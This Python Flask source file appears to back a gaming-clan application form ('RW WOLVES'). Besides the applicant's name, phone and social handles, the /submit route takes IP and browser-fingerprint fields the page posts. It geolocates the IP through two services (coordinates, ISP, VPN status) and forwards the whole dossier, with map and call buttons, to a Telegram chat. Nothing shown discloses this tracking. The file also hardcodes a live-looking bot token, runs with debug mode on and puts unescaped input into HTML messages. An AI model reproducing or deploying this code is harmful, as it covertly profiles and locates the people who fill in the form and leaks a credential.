import os
from flask import Flask, request, jsonify, render_template, send_from_directory
import requests
from datetime import datetime
import platform
import json
import socket
from urllib.parse import quote
from werkzeug.utils import secure_filename
import pytz

app = Flask(__name__)

# Конфигурация
UPLOAD_FOLDER = 'static/uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
MAX_CONTENT_LENGTH = 16 * 1024 * 1024  # 16MB

TELEGRAM_BOT_TOKEN = "7366514318:AAFNSvdBe5L9RM27mY9OnBEwRIH2dmizUVs"
TELEGRAM_CHAT_ID = "-1002255169087"

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

def format_datetime(dt_str):
    try:
        dt = datetime.fromisoformat(dt_str)
        moscow_tz = pytz.timezone('Europe/Moscow')
        dt_moscow = dt.astimezone(moscow_tz)
        return dt_moscow.strftime("%d.%m.%Y в %H:%M:%S (МСК)")
    except:
        return dt_str

def get_detailed_location(ip):
    try:
        # Получаем подробную информацию о местоположении через ipapi.co
        response = requests.get(f'https://ipapi.co/{ip}/json/')
        data = response.json()
        
        # Получаем дополнительную информацию через ip-api.com
        response2 = requests.get(f'http://ip-api.com/json/{ip}')
        data2 = response2.json()
        
        return {
            'ip': ip,
            'city': data.get('city', 'Не определен'),
            'region': data.get('region', 'Не определен'),
            'country': data.get('country_name', 'Не определена'),
            'country_code': data.get('country_code', ''),
            'postal': data.get('postal', 'Не определен'),
            'latitude': data.get('latitude', ''),
            'longitude': data.get('longitude', ''),
            'timezone': data.get('timezone', 'Не определен'),
            'currency': data.get('currency', 'Не определена'),
            'country_calling_code': data.get('country_calling_code', ''),
            'languages': data.get('languages', ''),
            'org': data.get('org', 'Не определен'),
            'asn': data.get('asn', 'Не определен'),
            # Дополнительная информация из ip-api.com
            'isp': data2.get('isp', 'Не определен'),
            'as': data2.get('as', 'Не определен'),
            'mobile': data2.get('mobile', False),
            'proxy': data2.get('proxy', False),
            'hosting': data2.get('hosting', False)
        }
    except:
        return {}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def get_system_info():
    return {
        'system': platform.system(),
        'release': platform.release(),
        'version': platform.version(),
        'machine': platform.machine(),
        'processor': platform.processor(),
        'hostname': socket.gethostname()
    }

def send_telegram_message(message, photo_path=None, location=None, telegram_username=None, phone=None):
    base_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
    
    # Создаем инлайн кнопки
    inline_keyboard = []
    
    # Добавляем кнопку для открытия карты, если есть координаты
    if location and location.get('latitude') and location.get('longitude'):
        lat = location['latitude']
        lon = location['longitude']
        map_url = f"https://www.google.com/maps?q={lat},{lon}"
        yandex_url = f"https://yandex.ru/maps/?pt={lon},{lat}&z=17&l=map"
        inline_keyboard.extend([
            [{
                "text": "🗺 Google Maps",
                "url": map_url
            }],
            [{
                "text": "🗺 Яндекс.Карты",
                "url": yandex_url
            }]
        ])

    # Добавляем кнопку для связи в Telegram
    if telegram_username:
        tg_url = f"tg://resolve?domain={telegram_username}"
        inline_keyboard.append([{
            "text": "💬 Написать в Telegram",
            "url": tg_url
        }])

    # Добавляем кнопку для звонка
    if phone:
        phone_url = f"tel:{phone.replace(' ', '')}"
        inline_keyboard.append([{
            "text": "📞 Позвонить",
            "url": phone_url
        }])

    # Формируем разметку с кнопками
    reply_markup = json.dumps({
        "inline_keyboard": inline_keyboard
    }) if inline_keyboard else None

    try:
        responses = []
        
        # Сначала отправляем фото, если оно есть
        if photo_path and os.path.exists(photo_path):
            print(f"Отправка фото: {photo_path}")
            with open(photo_path, 'rb') as photo:
                files = {
                    'photo': photo
                }
                params = {
                    'chat_id': TELEGRAM_CHAT_ID,
                    'caption': "📸 Скриншот профиля"
                }
                response = requests.post(f"{base_url}/sendPhoto", data=params, files=files)
                print(f"Ответ от Telegram API (sendPhoto): {response.json()}")
                responses.append(response.json())

        # Затем отправляем основное сообщение с информацией
        params = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML',
            'reply_markup': reply_markup
        }
        response = requests.post(f"{base_url}/sendMessage", json=params)
        print(f"Ответ от Telegram API (sendMessage): {response.json()}")
        responses.append(response.json())

        return responses
    except Exception as e:
        print(f"Ошибка при отправке в Telegram: {str(e)}")
        raise e

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    try:
        # Основная информация
        name = request.form.get('name', '')
        nickname = request.form.get('nickname', '')
        rank = request.form.get('rank', '')
        kd_ratio = request.form.get('kd_ratio', '')
        phone = request.form.get('phone', '')
        vk = request.form.get('vk', '')
        telegram = request.form.get('telegram', '').replace('@', '')
        
        # Системная информация
        system_info = get_system_info()
        
        # Информация о местоположении
        location_info = {k: v for k, v in request.form.items() if k.startswith('location_')}
        
        # Получаем расширенную информацию о местоположении
        detailed_location = get_detailed_location(location_info.get('location_ip', ''))
        location_info.update(detailed_location)
        
        browser_info = {k: v for k, v in request.form.items() if k.startswith('browser_')}
        submission_time = request.form.get('submission_time', datetime.now().isoformat())
        formatted_time = format_datetime(submission_time)

        # Обработка загруженного файла
        screenshot = request.files.get('screenshot')
        screenshot_path = None

        print("Файлы в запросе:", request.files)
        print("Скриншот:", screenshot)

        if screenshot and allowed_file(screenshot.filename):
            filename = secure_filename(f"{nickname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{screenshot.filename.rsplit('.', 1)[1].lower()}")
            screenshot_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            print(f"Сохранение файла: {screenshot_path}")
            screenshot.save(screenshot_path)
            print(f"Файл сохранен: {os.path.exists(screenshot_path)}")

        # Формируем сообщение для Telegram с HTML-форматированием
        message = f"""
🎮 <b>Новая заявка в RW WOLVES!</b>

<b>👤 Информация об игроке:</b>
• Имя: <code>{name}</code>
• Никнейм: <code>{nickname}</code>
• Ранг: <code>{rank}</code>
• K/D: <code>{kd_ratio}</code>
• Телефон: <code>{phone}</code>
• VK: {vk if vk else 'Не указан'}
• Telegram: @{telegram if telegram else 'Не указан'}

<b>📍 Геолокация:</b>
• IP: <code>{location_info.get('ip', 'Не определен')}</code>
• Город: {location_info.get('city', 'Не определен')}
• Регион: {location_info.get('region', 'Не определен')}
• Страна: {location_info.get('country', 'Не определена')} ({location_info.get('country_code', '')})
• Индекс: {location_info.get('postal', 'Не определен')}
• Координаты: <code>{location_info.get('latitude', '?')}, {location_info.get('longitude', '?')}</code>
• Часовой пояс: {location_info.get('timezone', 'Не определен')}
• Валюта: {location_info.get('currency', 'Не определена')}
• Языки: {location_info.get('languages', 'Не определены')}
• Телефонный код: {location_info.get('country_calling_code', 'Не определен')}

<b>🌐 Сетевая информация:</b>
• Провайдер: {location_info.get('isp', 'Не определен')}
• AS: {location_info.get('as', 'Не определен')}
• ASN: {location_info.get('asn', 'Не определен')}
• Организация: {location_info.get('org', 'Не определена')}
• Мобильная сеть: {'Да' if location_info.get('mobile', False) else 'Нет'}
• Прокси/VPN: {'Да' if location_info.get('proxy', False) else 'Нет'}
• Хостинг: {'Да' if location_info.get('hosting', False) else 'Нет'}

<b>💻 Техническая информация:</b>
• Браузер: {browser_info.get('browser_userAgent', 'Не определен')}
• Платформа: {browser_info.get('browser_platform', 'Не определена')}
• Разрешение экрана: {browser_info.get('browser_screenResolution', 'Не определено')}
• Язык: {browser_info.get('browser_language', 'Не определен')}
• Система: {system_info['system']} {system_info['release']}
• Процессор: {system_info['processor']}
• Хост: {system_info['hostname']}

<b>⚡️ Дополнительно:</b>
• Цветовая глубина: {browser_info.get('browser_colorDepth', 'Не определена')}
• Локальное время: {browser_info.get('browser_timezone', 'Не определено')}
• Смещение времени: {browser_info.get('browser_timezoneOffset', 'Не определено')} мин

⏰ <b>Время подачи заявки:</b> {formatted_time}

<i>Используйте кнопки ниже для быстрых действий</i>
"""

        # Отправляем сообщение и фото в Telegram
        location_data = {
            'latitude': location_info.get('latitude'),
            'longitude': location_info.get('longitude')
        }

        print(f"Отправка в Telegram. Путь к фото: {screenshot_path}")
        # Отправляем сообщение с фото в Telegram
        response = send_telegram_message(message, screenshot_path, location_data, telegram, phone)
        print(f"Ответ после отправки в Telegram: {response}")

        return jsonify({'success': True})
    except Exception as e:
        print(f"Ошибка: {str(e)}")
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
    app.run(debug=True)
